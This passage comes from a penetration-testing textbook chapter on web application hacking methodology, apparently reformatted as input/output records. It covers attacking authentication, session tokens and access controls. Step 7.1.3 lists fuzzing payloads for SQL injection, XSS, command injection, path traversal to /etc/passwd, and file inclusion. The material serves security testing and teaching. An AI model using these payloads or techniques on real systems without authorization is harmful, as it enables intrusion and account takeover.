near\nthe main login function.\n4.5.2. Establish how the account recovery function works by doing a com-\nplete walk-through of the recovery process using an account you\ncontrol.\n4.5.3. If the function uses a challenge such as a secret question, determine\nwhether users are able to set or select their own challenge during\nregistration. If so, use a list of enumerated or common usernames to\nharvest a list of challenges, and review this for any that appear to be\neasily guessable.\n4.5.4. If the function uses a password hint, perform the same exercise to\nharvest a list of password hints, and identify any that appear to be\neasily guessable.\n4.5.5. Perform the same tests on any account-recovery challenges as you\nperformed at the main login function to assess vulnerability to auto-\nmated guessing attacks.\n4.5.6. If the function involves sending an email to the user to complete the\nrecovery process, look for any weaknesses that may enable you to\ntake control of other users’ accounts. Determine whether it is possi-\nble to control the address to which the email is sent. If the message\ncontains a unique recovery URL, obtain a number of messages using\nan email address you control, and attempt to identify any patterns\nthat may enable you to predict the URLs issued to other users. Apply\nthe methodology described in step 5.3 to identify any predictable\nsequences.\n4.6. Test Any Remember Me Function\n4.6.1. If the main login function or its supporting logic contains a Remember\nMe function, activate this and review its effects. If this function allows\nthe user to log in on subsequent occasions without entering any cre-\ndentials, then you should review it closely for any vulnerabilities.\n4.6.2. Closely inspect all persistent cookies that are set when the Remember\nMe function is activated. Look for any data that identifies the user\nexplicitly or appears to contain some predictable identifier of the user.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 683\nChapter 20 ■ A Web Application Hacker’s Methodology 683\n4.6.3. Even where the data stored appears to be heavily encoded or obfus-\ncated, review this closely and compare the results of remembering\nseveral very similar usernames and/or passwords to identify any\nopportunities for reverse engineering the original data. Apply the\nmethodology described in step 5.2 to identify any meaningful data.\n4.6.4. Depending on your results, modify the contents of your cookie in\nsuitable ways in an attempt to masquerade as other users of the\napplication.\n4.7. Test Any Impersonation Function\n4.7.1. If the application contains any explicit functionality that allows one\nuser to impersonate another, review this closely for any vulnerabili-\nties that may enable you to impersonate arbitrary users without\nproper authorization.\n4.7.2. Look for any user-supplied data that is used to determine the target\nof the impersonation. Attempt to manipulate this to impersonate\nother users, particularly administrative users, which may enable you\nescalate privileges.\n4.7.3. If you perform any automated password-guessing attacks against\nother user accounts, look for any accounts that appear to have more\nthan one valid password, or multiple accounts that appear to have\nthe same password. This may indicate the presence of a backdoor\npassword, which administrators can use to access the application\nas any user.\n4.8. Test Username Uniqueness\n4.8.1. If the application has a self-registration function that lets you specify\na desired username, attempt to register the same username twice\nwith different passwords.\n4.8.2. If the application blocks the second registration attempt, you can\nexploit this behavior to enumerate registered usernames.\n4.8.3. If the application registers both accounts, probe further to determine\nits behavior when a collision of both username and password occurs.\nAttempt to change the password of one of the accounts to match that\nof the other. Also, attempt to register two accounts with identical\nusernames and passwords.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 684\n684 Chapter 20 ■ A Web Application Hacker’s Methodology\n4.8.4. If the application alerts you or generates an error when a collision of\nusername and password occurs, you can probably exploit this to per-\nform an automated guessing attack to discover another user’s pass-\nword. Target an enumerated or guessed username, and attempt to\ncreate accounts that have this username and different passwords.\nWhen the application rejects one specific password, you have proba-\nbly found the existing password for the targeted account.\n4.8.5. If the application appears to tolerate a collision of username and\npassword without an error, log in using the colliding credentials and\ndetermine what happens and whether the application’s behavior can\nbe leveraged to gain unauthorized access to other users’ accounts.\n4.9. Test Predictability of Auto-Generated Credentials\n4.9.1. If usernames or passwords are automatically generated by the appli-\ncation, try to obtain several values in quick succession and identify\nany detectable sequences or patterns.\n4.9.2. If usernames are generated in a predictable way, extrapolate back-\nwards to obtain a list of possible valid usernames. This can be used\nas the basis for automated password-guessing and other attacks.\n4.9.3. If passwords are generated in a predictable way, extrapolate the pat-\ntern to obtain a list of possible passwords issued to other application\nusers. This can be combined with any lists of usernames you obtain\nto perform a password-guessing attack.\n4.10. Check for Unsafe Transmission of Credentials\n4.10.1. Walk through all authentication-related functions that involve trans-\nmission of credentials, including the main login, account registration,\npassword change, and any page that allows viewing or updating of\nuser profile information. Monitor all traffic passing in both directions\nbetween the client and server using your intercepting proxy.\n4.10.2. Identify every case in which the credentials are transmitted in either\ndirection. You can set interception rules in your proxy to flag mes-\nsages containing specific strings.\n4.10.3. If credentials are ever transmitted in the URL query string, these are\npotentially vulnerable to disclosure in the browser history, on-screen,\nin server logs, and in the Refererheader when third-party links are\nfollowed.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 685\nChapter 20 ■ A Web Application Hacker’s Methodology 685\n4.10.4. If credentials are ever stored in a cookie, these are potentially vulner-\nable to disclosure via XSS attacks or local privacy attacks.\n4.10.5. If credentials are ever transmitted back from the server to the client,\nthese may be compromised via any vulnerabilities in session man-\nagement or access controls, or in an XSS attack.\n4.10.6. If credentials are ever transmitted over an unencrypted connection,\nthese are vulnerable to interception by an eavesdropper.\n4.10.7. If credentials are submitted using HTTPS but the login form itself is\nloaded using HTTP, then the application is vulnerable to a man-in-\nthe-middle attack that may be used to capture credentials.\n4.11. Check for Unsafe Distribution of Credentials\n4.11.1. If accounts are created via some out-of-band channel, or the applica-\ntion has a self-registration function that does not itself determine all\nof a user’s initial credentials, establish the means by which creden-\ntials are distributed to new users. Common methods include sending\na message to an email or postal address.\n4.11.2. If the application generates account activation URLs that are distrib-\nuted out-of-band, try to register several new accounts in close succes-\nsion, and identify any sequence in the URLs you receive. If a pattern\ncan be determined, try to predict the URLs sent to recent and forth-\ncoming users, and attempt to use these URLs to take ownership of\ntheir accounts.\n4.11.3. Try to reuse a single activation URL multiple times, and see if the\napplication allows this. If not, try locking out the target account\nbefore reusing the URL, and see if the URL still works. Determine\nwhether this enables you to set a new password on an already active\naccount.\n4.12. Test for Logic Flaws\n4.12.1. Test for Fail-Open Conditions\n4.12.1.1. For each function in which the application checks a user’s creden-\ntials, including the login and password change functions, walk\nthrough the process in the normal way, using an account you control.\nNote every request parameter submitted to the application.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 686\n686 Chapter 20 ■ A Web Application Hacker’s Methodology\n4.12.1.2. Repeat the process numerous times, modifying each parameter in\nturn in various unexpected ways designed to interfere with the\napplication’s logic. For each parameter, include the following\nchanges:\n■■ Submit an empty string as the value.\n■■ Remove the name/value pair altogether.\n■■ Submit very long and very short values.\n■■ Submit strings instead of numbers and vice versa.\n■■ Submit the same named parameter multiple times, with the same\nand different values.\n4.12.1.3. Review closely the application’s responses to the preceding requests.\nIf any unexpected divergences from the base case occur, feed this\nobservation back into your framing of further test cases. If one modi-\nfication causes a change in behavior, try to combine this with other\nchanges to push the application’s logic to its limits.\n4.12.2. Test Any Multistage Mechanisms\n4.12.2.1. If any authentication-related function involves submitting credentials\nin a series of different requests, identify the apparent purpose of each\ndistinct stage, and note the parameters submitted at each stage.\n4.12.2.2. Repeat the process numerous times, modifying the sequence of\nrequests in ways designed to interfere with the application’s logic,\nincluding the following tests:\n■■ Proceed through all stages but in a different sequence to the one\nintended.\n■■ Proceed directly to each stage in turn, and continue the normal\nsequence from there.\n■■ Proceed through the normal sequence several times, skipping\neach stage in turn, and continuing the normal sequence from the\nnext stage.\n■■ On the basis of your observations and the apparent purpose of\neach stage of the mechanism, try to think of further ways of modi-\nfying the sequence and accessing the different stages that the\ndevelopers may not have anticipated.\n4.12.2.3. Determine whether any single piece of information (such as the user-\nname) is submitted at more than one stage, either because it is cap-\ntured more than once from the user or because it is transmitted via\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 687\nChapter 20 ■ A Web Application Hacker’s Methodology 687\nthe client in a hidden form field, cookie, or preset query string\nparameter. If so, try submitting different values at different stages\n(both valid and invalid), and observing the effect. Try to determine\nwhether the submitted item is sometimes superfluous, or is validated\nat one stage and then trusted subsequently, or is validated at differ-\nent stages against different checks. Try to exploit the application’s\nbehavior to gain unauthorized access or reduce the effectiveness of\nthe controls imposed by the mechanism.\n4.12.2.4. Look for any data that is transmitted via the client that has not been\ncaptured from the user at any point. If hidden parameters are used to\ntrack the state of the process across successive stages, then it may be\npossible to interfere with the application’s logic by modifying these\nparameters in crafted ways.\n4.12.2.5. If any part of the process involves the application presenting a ran-\ndomly varying challenge, test for two common defects:\n■■ If a parameter specifying the challenge is submitted along with\nthe user’s response, determine whether you can effectively choose\nyour own challenge by modifying this value.\n■■ Try proceeding as far as the varying challenge several times with\nthe same username, and determine whether a different challenge\nis presented. If so, then you can effectively choose your own chal-\nlenge by proceeding to this stage repeatedly until your desired\nchallenge is presented.\n4.13. Exploit Any Vulnerabilities to Gain\nUnauthorized Access\n4.13.1. Review any vulnerabilities you have identified within the various\nauthentication functions, and identify any that you can leverage to\nachieve your objectives in attacking the application. This will typi-\ncally involve attempting to authenticate as a different user—if\npossible, a user with administrative privileges.\n4.13.2. Before mounting any kind of automated attack, take note of any\naccount lockout defenses that you have identified. For example,\nwhen performing username enumeration against a login function,\nsubmit a common password with each request rather than a com-\npletely arbitrary value, so as not to waste a failed login attempt on\nevery username discovered. Similarly, perform any password guess-\ning attacks on a breadth-first, not depth-first, basis. Start your word"
  },
  {
    "input": "5. Test the Session Management Mechanism",
    "output": "70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 688\n688 Chapter 20 ■ A Web Application Hacker’s Methodology\nlist with the most common weak passwords, and proceed through\nthis list trying each item against every enumerated username.\n4.13.3. Take account of the password quality rules and the completeness of\npassword validation when constructing word lists to use in any pass-\nword-guessing attack, to avoid impossible or superfluous test cases.\n4.13.4. Use the techniques described in Chapter 13 to automate as much\nwork as possible and maximize the speed and effectiveness of your\nattacks.\n5. Test the Session Management Mechanism\n5.1. Understand the mechanism\nToken generation Token handling\n5.2. Test for meaning 5.4. Check for insecure transmission\n5.3. Test for predictability 5.5. Check for disclosure in logs\n5.6. Test mapping of tokens to sessions\n5.7. Test session termination\n5.8. Test for session fixation\n5.9. Check for XSRF\n5.10. Check cookie scope\nFigure20-6: Testing the session management mechanism\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 689\nChapter 20 ■ A Web Application Hacker’s Methodology 689\n5.1. Understand the Mechanism\n5.1.1. Analyze the mechanism used for managing sessions and state.\nEstablish whether the application uses session tokens or some\nother method of handling the series of requests received from each\nuser. Note that some authentication technologies (such as HTTP\nauthentication) may not require a full session mechanism in order to\nre-identify users post-authentication. Also, some applications use a\nsessionless state mechanism in which all state information is trans-\nmitted via the client, usually in an encrypted or obfuscated form.\n5.1.2. If the application uses session tokens, confirm precisely which pieces\nof data are actually used to re-identify users. Items that may be used\nto transmit tokens include HTTP cookies, query string parameters,\nand hidden form fields. Several different pieces of data may be used\ncollectively to re-identify the user, and different items may be used\nby different back-end components. Often, items that look like session\ntokens may not actually be employed as such by the application—\nfor example, the default cookie generated by the web server.\n5.1.3. To verify which items are actually being employed as session tokens,\nfind a page or function which is certainly session-dependent (such as\na user-specific My Details page), and make several requests for it, sys-\ntematically removing each item that you suspect is being used as a\nsession token. If removing an item stops the session-dependent page\nfrom being returned, then this may confirm that the item is a session\ntoken. Burp Repeater is a useful tool for performing these tests.\n5.1.4. Having established which items of data are actually being used to re-\nidentify users, for each token confirm whether it is being validated in\nits entirety, or whether some subcomponents of the token are\nignored. Change the token’s value one byte at a time, and check\nwhether the modified value is still accepted. If you find that certain\nportions of the token are not actually used to maintain session state,\nyou can exclude these from any further analysis.\n5.2. Test Tokens for Meaning\n5.2.1. Log in as several different users at different times, and record the\ntokens received from the server. If self-registration is available and\nyou can choose your username, log in with a series of similar user-\nnames containing small variations between them, such as: A, AA,\nAAA, AAAA, AAAB, AAAC, AABA, and so on. If other user-specific\ndata is submitted at the login or stored in user profiles (such as an\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 690\n690 Chapter 20 ■ A Web Application Hacker’s Methodology\nemail address), perform a similar exercise to modify that data sys-\ntematically and capture the resulting tokens.\n5.2.2. Analyze the tokens you receive for any correlations that appear to be\nrelated to the username and other user-controllable data.\n5.2.3. Analyze the tokens for any detectable encoding or obfuscation. Look\nfor correlations between the length of the username and the length\nof the token, which strongly indicate that some kind of obfuscation\nor encoding is in use. Where the username contains a sequence of the\nsame character, look for a corresponding character sequence in the\ntoken, which may indicate the use of XOR obfuscation. Look for\nsequences in the token that contain only hexadecimal characters,\nwhich may indicate a hex-encoding of an ASCII string or other infor-\nmation. Look for sequences ending in an equals sign and/or contain-\ning only the other valid Base64 characters: a–z, A–Z, 0–9, +, and /.\n5.2.4. If you can identify any meaningful data within your sample of ses-\nsion tokens, consider whether this is sufficient to mount an attack\nthat attempts to guess the tokens recently issued to other application\nusers. Find a page of the application which is session-dependent and\nuse the techniques described in Chapter 13 to automate the task of\ngenerating and testing possible tokens.\n5.3. Test Tokens for Predictability\n5.3.1. Generate and capture a large number of session tokens in quick suc-\ncession, using a request that causes the server to return a new token\n(for example, a successful login request).\n5.3.2. Attempt to identify any patterns within your sample of tokens. You\ncan use a tool such as the cookie analyzer within WebScarab to iden-\ntify some obvious sequences or time dependencies. However, in\nmost cases you will need to perform some manual analysis:\n■■ Apply your understanding of which tokens and subsequences\nare actually used by the application to re-identify users. Ignore\nany data that is not used in this way, even if it varies between\nsamples.\n■■ If it is unclear what type of data is contained within the token, or\nany individual component of it, try applying various decodings\n(for example, Base64) to see if any more meaningful data emerges.\nIt may be necessary to apply several decodings in sequence.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 691\nChapter 20 ■ A Web Application Hacker’s Methodology 691\n■■ Try to identify any patterns in the sequences of values contained\nwithin each decoded token or component. Calculate the differ-\nences between successive values. Even if these appear to be\nchaotic, there may be a fixed set of observed differences, which\nnarrows down the scope of any brute-force attack considerably.\n■■ Obtain a similar sample of tokens after waiting for a few minutes,\nand repeat the same analysis. Try to detect whether any of the\ntokens’ content is time-dependent.\n■■ In the most security-critical applications, consider performing\nfull-blown randomness tests using a tool such as Stompy. See\nChapter 7 for more details of this testing.\n5.3.3. If you identify any patterns, capture a second sample of tokens\nusing a different IP address and a different username, to identify\nwhether the same pattern is detected, and whether tokens received\nin the first exercise could be extrapolated to guess tokens received in\nthe second.\n5.3.4. If you can identify any exploitable sequences or time dependencies,\nconsider whether this is sufficient to mount an attack that attempts to\nguess the tokens recently issued to other application users. Use the\ntechniques described in Chapter 13 to automate the task of generat-\ning and testing possible tokens. Except in the simplest kind of\nsequences, it is likely that your attack will need to involve a cus-\ntomized script of some kind.\n5.4. Check for Insecure Transmission of Tokens\n5.4.1. Walk through the application as normal, starting with unauthenti-\ncated content at the start URL, proceeding through the login process,\nand then through all of the application’s functionality. Make a note of\nevery occasion on which a new session token is issued, and which\nportions of your communications use HTTP and which use HTTPS.\nYou can use the logging function of your intercepting proxy to record\nthis information.\n5.4.2. If HTTP cookies are being used as the transmission mechanism for\nsession tokens, verify whether the secure flag is set, preventing them\nfrom ever being transmitted over HTTP connections.\n5.4.3. Determine whether, in the normal use of the application, session\ntokens are ever transmitted over an HTTP connection. If so, they are\nvulnerable to interception.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 692\n692 Chapter 20 ■ A Web Application Hacker’s Methodology\n5.4.4. In cases where the application uses HTTP for unauthenticated areas,\nand switches to HTTPS for the login and/or authenticated areas of\nthe application, verify whether a new token is issued for the HTTPS\nportion of the communications, or whether a token issued during the\nHTTP stage remains active when the application switches to HTTPS.\nIf so, the token is vulnerable to interception.\n5.4.5. If the HTTPS area of the application contains any links to HTTP\nURLs, follow these and verify whether the session token is submit-\nted, and if so whether it continues to be valid or is immediately ter-\nminated by the server.\n5.5. Check for Disclosure of Tokens in Logs\n5.5.1. If your application mapping exercises identified any logging, moni-\ntoring, or diagnostic functionality, review these functions closely to\ndetermine whether any session tokens are disclosed within them.\nConfirm who is normally authorized to access these functions, and if\nthey are intended for administrators only, whether any other vulnera-\nbilities exist that could enable a lower-privileged user to access them.\n5.5.2. Identify any instances where session tokens are transmitted within\nthe URL. It may be that tokens are generally transmitted in a more\nsecure manner, but that developers have used the URL in specific\ncases to work around a particular problem. If so, these may be trans-\nmitted in the Refererheader when users follow any offsite links.\nCheck for any functionality that enables you to inject arbitrary off-\nsite links into pages viewed by other users.\n5.5.3. If you find any means of gathering valid session tokens issued to\nother users, look for a way of testing each token to determine\nwhether it belongs to an administrative user (for example, by\nattempting to access a privileged function using the token).\n5.6. Check Mapping of Tokens to Sessions\n5.6.1. Log in to the application twice using the same user account, either\nfrom different browser processes or from different computers. Deter-\nmine whether both sessions remain active concurrently. If so, the\napplication supports concurrent sessions, enabling an attacker who\nhas compromised another user’s credentials to make use of these\nwithout risk of detection.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 693\nChapter 20 ■ A Web Application Hacker’s Methodology 693\n5.6.2. Log in and log out several times using the same user account, either\nfrom different browser processes or from different computers. Deter-\nmine whether a new session token is issued each time, or whether\nthe same token is issued each time the same account logs in. If the\nlatter occurs, then the application is not really employing proper ses-\nsion tokens at all, but is using unique persistent strings to re-identify\neach user. In this situation, there is no way to protect against concur-\nrent logins or properly enforce session timeout.\n5.6.3. If tokens appear to contain any structure and meaning, attempt to\nseparate out components that may identify the user from those that\nappear to be inscrutable. Try to modify any user-related components\nof the token so that they refer to other known users of the applica-\ntion, and verify whether the resulting token (a) is accepted by the\napplication, and (b) enables you to masquerade as that user. See\nChapter 7 for examples of this kind of subtle vulnerability.\n5.7. Test Session Termination\n5.7.1. When testing for session timeout and logout flaws, focus solely on\nthe server’s handling of sessions and tokens, rather than any events\nthat occur on the client. In terms of session termination, nothing\nmuch depends upon what happens to the token within the client\nbrowser.\n5.7.2. Check whether session expiration is implemented on the server:\n■■ Log in to the application to obtain a valid session token.\n■■ Wait for a period without using this token, and then submit a\nrequest for a protected page (for example My Details) using the\ntoken.\n■■ If the page is displayed normally, then the token is still active.\n■■ Use trial and error to determine how long any session expiration\ntimeout is, or whether a token can still be used days after the pre-\nvious request which used it. Burp Intruder can be configured to\nincrement the time interval between successive requests, to auto-\nmate this task.\n5.7.3. Check whether a logout function exists. If so, test whether it effec-\ntively invalidates the user’s session on the server. After logging out,\nattempt to reuse the old token and determine whether it is still valid\nby requesting a protected page using the token. If the session is still\nactive, then users remain vulnerable to some session hijacking\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 694\n694 Chapter 20 ■ A Web Application Hacker’s Methodology\nattacks even after they have “logged out.” You can use Burp Repeater\nto keep sending a specific request from the proxy history, to see\nwhether the application responds differently after you log out.\n5.8. Check for Session Fixation\n5.8.1. If the application issues session tokens to unauthenticated users,\nobtain a token and perform a login. If the application does not issue a\nfresh token following a successful login, then it is vulnerable to ses-\nsion fixation.\n5.8.2. Even if the application does not issue session tokens to unauthenti-\ncated users, obtain a token by logging in, and then return to the login\npage. If the application is willing to return this page even though you\nare already authenticated, submit another login as a different user\nusing the same token. If the application does not issue a fresh token\nafter the second login, then it is vulnerable to session fixation.\n5.8.3. Identify the format of session tokens used by the application. Modify\nyour token to an invented value that is validly formed, and attempt\nto login. If the application allows you to create an authenticated ses-\nsion using an invented token, then it is vulnerable to session fixation.\n5.8.4. If the application does not support login, but processes sensitive user\ninformation (such as personal and payment details), and allows this\nto be displayed after submission (for example, a Verify My Order\npage), then carry out the preceding three tests in relation to the pages\ndisplaying sensitive data. If a token set during anonymous usage of\nthe application can later be used to retrieve sensitive user informa-\ntion, then the application is vulnerable to session fixation.\n5.9. Check for XSRF\n5.9.1. If the application relies solely upon HTTP cookies as its method for\ntransmitting session tokens, then it may well be vulnerable to cross-\nsite request forgery attacks.\n5.9.2. Review the key functionality of the application and identify the spe-\ncific requests that are used to perform sensitive actions. If parameters\nto any of these requests can be fully determined in advance by an\nattacker (that is, they do not contain any session tokens, unpre-\ndictable data, or other secrets) then the application is almost certainly\nvulnerable.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 695\nChapter 20 ■ A Web Application Hacker’s Methodology 695\n5.9.3. Create an HTML page that will issue the desired request without any\nuser interaction. For GETrequests, you can place an <img>tag with\nthe srcparameter set to the vulnerable URL. For POSTrequests, you\ncan create a form that contains hidden fields for all of the relevant\nparameters required for the attack and has its target set to the vulner-\nable URL. You can use JavaScript to auto-submit the form as soon as\nthe page loads. While logged in to the application, use the same\nbrowser to load your HTML page. Verify that the desired action is\ncarried out within the application.\n5.9.4. If the application uses Ajax, look for any instances where a response\ncontains sensitive data in JSON format or other JavaScript. If any\ninstances exist, check for JSON hijacking vulnerabilities.\n5.9.4.1. As with standard XSRF, determine whether it is possible to construct\na cross-domain request to retrieve the JSON data. If the request does\nnot contain any unpredictable parameters, then the application may\nbe vulnerable.\n5.9.4.2. If the application’s own request for the data uses the POSTmethod,\ndetermine whether the request is still accepted when you change the\nmethod to GETand move the body parameters to the URL query\nstring. If not, then the application is probably not vulnerable.\n5.9.4.3. If the preceding requirements are met, determine whether you can\nconstruct a web page that will succeed in gaining access to the target\napplication’s response data, by including it via a <script>tag. Try\nthe two techniques described, or any others that may be appropriate\nin unusual situations.\n5.10. Check Cookie Scope\n5.10.1. If the application uses HTTP cookies to transmit session tokens (or\nany other sensitive data), review the relevant Set-Cookieheaders,\nand check for any domain or path attributes used to control the\nscope of the cookies.\n5.10.2. If the application explicitly liberalizes its cookies’ scope to a parent\ndomain or parent directory, then it may be leaving itself vulnerable\nto attacks via other web applications that are hosted within the par-\nent domain or directory.\n5.10.3. If the application sets its cookies’ domain scope to its own domain\nname (or does not specify a domain attribute), then it may still be\nexposed to attacks via any applications hosted on subdomains. This\nis a consequence of the way cookie scoping works and cannot be"
  },
  {
    "input": "6. Test Access Controls",
    "output": "70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 696\n696 Chapter 20 ■ A Web Application Hacker’s Methodology\navoided other than by not hosting any other applications on a sub -\ndomain of a security-sensitive application.\n5.10.4. If an application specifies its cookies’ path scope without using a\ntrailing slash, then it might be exposed to other applications residing\nat paths containing a prefix which matches the specified scope. For\nexample, an application residing at /bank/would be exposed to any\ncookie-related vulnerabilities in applications residing at /banktest/.\n5.10.5. Identify all of the possible domain names and paths that will receive\nthe cookies issued by the application. Establish whether any other\nweb applications are accessible via these domain names or paths that\nyou may be able to leverage to capture the cookies issued to users of\nthe target application.\n6. Test Access Controls\n6.4. Test for\n6.1. Understand the requirements\ninsecure methods\n6.2. Testing with 6.3. Testing with\nmultiple accounts limited access\nFigure20-7: Testing access controls\n6.1. Understand the Access Control Requirements\n6.1.1. Based on the core functionality implemented within the application,\nunderstand the broad requirements for access control, in terms of\nvertical segregation (different levels of user having access to different\ntypes of functionality) and horizontal segregation (users at the same\nprivilege level having access to different subsets of data). Very often,\nboth types of segregation are present—for example, ordinary users\nmay be able to access their own data, while administrators can access\neveryone’s data.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 697\nChapter 20 ■ A Web Application Hacker’s Methodology 697\n6.1.2. Review your application mapping results to identify the areas of\nfunctionality and types of data resources that represent the most\nfruitful targets for privilege escalation attacks.\n6.1.3. To perform the most effective testing for access control vulnerabili-\nties, you should ideally obtain a number of different accounts with\ndifferent vertical and horizontal privileges. If self-registration is pos-\nsible, you can probably obtain the latter directly from the application.\nTo obtain the former, you will probably need the cooperation of the\napplication owner (or exploit some vulnerability to gain access to a\nhigh privileged account). The availability of different kinds of\naccounts will affect the types of testing you can perform, as\ndescribed next.\n6.2. Testing with Multiple Accounts\n6.2.1. If the application enforces vertical privilege segregation, first use a\npowerful account to locate all of the functionality that it can access,\nand then use a less-privileged account and attempt to access each\nitem of this functionality.\n6.2.2. If the application enforces horizontal privilege segregation, perform\nthe equivalent test using two different accounts at the same privilege\nlevel, attempting to use one account to access data belonging to the\nother account. This typically involves replacing an identifier (such as\na document ID) within a request to specify a resource belonging to\nthe other user.\n6.2.3. When you perform any kind of access control test, be sure to test\nevery step of multistage functions individually, to confirm whether\naccess controls have been properly implemented at each stage, or\nwhether the application assumes that users who access a later stage\nmust have passed security checks implemented at the earlier stages.\nFor example, if an administrative page containing a form is properly\nprotected, check whether the actual form submission is also sub-\njected to proper access controls.\n6.3. Testing with Limited Access\n6.3.1. If you do not have prior access to accounts at different privilege lev-\nels, or to multiple accounts with access to different data, then testing\nfor broken access controls is not quite as straightforward. Many com-\nmon vulnerabilities will be much harder to locate because you do not\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 698\n698 Chapter 20 ■ A Web Application Hacker’s Methodology\nknow the names of the URLs, identifiers, and parameters that are\nneeded to actually exploit the weaknesses.\n6.3.2. In your application mapping exercises that use a low-privileged\naccount, you may have identified the URLs for privileged functions\nsuch as administrative interfaces. If these are not adequately pro-\ntected, you will probably already know about this.\n6.3.3. Most data that is subject to horizontal access controls is accessed\nusing an identifier, such as an account number or order reference. To\ntest whether access controls are effective using only a single account,\nyou will need to try and guess or discover the identifiers associated\nwith other users’ data. If it is possible, generate a series of identifiers\nin quick succession (for example, by creating several new orders),\nand attempt to identify any patterns that may enable you to predict\nthe identifiers issued to other users. If there is no way to generate\nnew identifiers, then you are probably restricted to analyzing those\nwhich you already have and guessing on the basis of these.\n6.3.4. If you find a means of predicting the identifiers issued to other users,\nuse the techniques described in Chapter 13 to mount an automated\nattack to harvest interesting data belonging to other users. Use the\nExtract Grep function in Burp Intruder to capture the relevant infor-\nmation from within the application’s responses.\n6.4. Test for Insecure Access Control Methods\n6.4.1. Some applications implement access controls based on request\nparameters in an inherently unsafe way. Look for parameters like\nedit=falseor access=readin any key requests, and modify these in\nline with their apparent role, to try and interfere with the applica-\ntion’s access control logic.\n6.4.2. Some applications base access control decisions on the HTTP\nRefererheader. For example, an application may properly control\naccess to /admin.jspand accept any request showing this as its\nReferer. To test for this behavior, attempt to perform some privi-\nleged actions to which you are authorized and submit a missing or\nmodified Refererheader. If this change causes the application to\nblock your request, then it may well be using the Refererheader in\nan unsafe way. Try performing the same action as an unauthorized\nuser, but supply the original Refererheader and see whether the\naction succeeds."
  },
  {
    "input": "7. Test for Input-Based Vulnerabilities",
    "output": "70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 699\nChapter 20 ■ A Web Application Hacker’s Methodology 699\n7. Test for Input-Based Vulnerabilities\nMany important categories of vulnerability are triggered by unexpected user\ninput and can appear anywhere within the application. An effective way of\nprobing the application for these vulnerabilities is to fuzz every parameter to\nevery request with a set of attack strings.\n7.1. Fuzz all request parameters\n7.3. XSS & 7.4. OS\n7.2. SQL 7.5. Path 7.6. Script 7.7. File\nresponse command\ninjection traversal injection inclusion\ninjection injection\nFigure20-8: Testing for input-based vulnerabilities\n7.1. Fuzz All Request Parameters\n7.1.1. Review the results of your application mapping exercises and iden-\ntify every distinct client request which submits parameters that are\nprocessed by the server-side application. Relevant parameters\ninclude items within the URL query string, parameters in the request\nbody, and HTTP cookies. Also include any other items of user input\nthat have been observed to have an effect on the application’s behav-\nior, such as the Refereror User-Agentheaders.\n7.1.2. To fuzz the parameters, you can use your own scripts or a ready-\nmade fuzzing tool. For example, to use Burp Intruder, load each\nrequest in turn into the tool. An easy way to do this is to intercept a\nrequest in Burp Proxy and select the Send to Intruder action, or to\nright-click an item in the Burp Proxy history and select this option.\nUsing this option will configure Burp Intruder with the contents of\nthe request, and the correct target host and port, and will automati-\ncally mark the values of all request parameters as payload positions,\nready for fuzzing.\n7.1.3. Using the payloads tab, configure a suitable set of attack payloads to\nprobe for vulnerabilities within the application. You can enter pay-\nloads manually, load them from a file, or select one of the preset\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 700\n700 Chapter 20 ■ A Web Application Hacker’s Methodology\npayload lists. Fuzzing every request parameter within the applica-\ntion typically entails issuing a very large number of requests and\nreviewing the results for anomalies. If your set of attack strings is too\nlarge, this can be counterproductive and generate a prohibitively\nlarge amount of output for you to review. Hence, a sensible approach\nis to target a range of common vulnerabilities that can often be easily\ndetected in anomalous responses to specific crafted inputs and that\noften manifest themselves anywhere within the application rather\nthan within specific types of functionality. Here is a suitable set of\npayloads that you can use to test for some common categories of\nvulnerability:\nSQL Injection\n'\n'--\n'; waitfor delay '0:30:0'--\n1; waitfor delay '0:30:0'--\nXSS and Header Injection\nxsstest\n\"><script>alert('xss')</script>\nOS Command Injection\n|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &\n| ping –i 30 127.0.0.1 |\n| ping –n 30 127.0.0.1 |\n& ping –i 30 127.0.0.1 &\n& ping –n 30 127.0.0.1 &\n; ping 127.0.0.1 ;\n%0a ping –i 30 127.0.0.1 %0a\n` ping 127.0.0.1 `\nPath Traversal\n../../../../../../../../../../etc/passwd\n../../../../../../../../../../boot.ini\n..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd\n..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini\nScript Injection\n;echo 111111\necho 111111\nresponse.write 111111\n:response.write 111111\nFile Inclusion\nhttp://<your server name>/\nhttp://<nonexistent IP address>/\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 701\nChapter 20 ■ A Web Application Hacker’s Methodology 701\n7.1.4. All of the preceding payloads are shown in their literal form, and the\ncharacters ?;&+space and =need to be URL-encoded because they\nhave special meaning within HTTP requests. By default, Burp\nIntruder will perform the necessary encoding of these characters, so\nensure that this option has not been disabled. (To restore all options\nto their defaults following earlier customization, select the Restore\nDefaults option from the Burp menu.)\n7.1.5. In the Grep function of Burp Intruder, configure a suitable set of\nstrings to flag some common error messages within responses. For\nexample:\nerror\nexception\nillegal\ninvalid\nfail\nstack\naccess\ndirectory\nfile\nnot found\nvarchar\nODBC\nSQL\nSELECT\n111111\nNote that the string 111111is included to test for successful script\ninjection attacks—the payloads in step 7.1.3 involve writing this\nvalue into the server’s response.\n7.1.6. Also select the Payload Grep option, to flag responses that contain\nthe payload itself, indicating a potential XSS or header injection\nvulnerability.\n7.1.7. Set up a web server or netcat listener on the host you specified in\nthe first file inclusion payload, to monitor for connection attempts\nreceived from the server resulting from a successful remote file inclu-\nsion 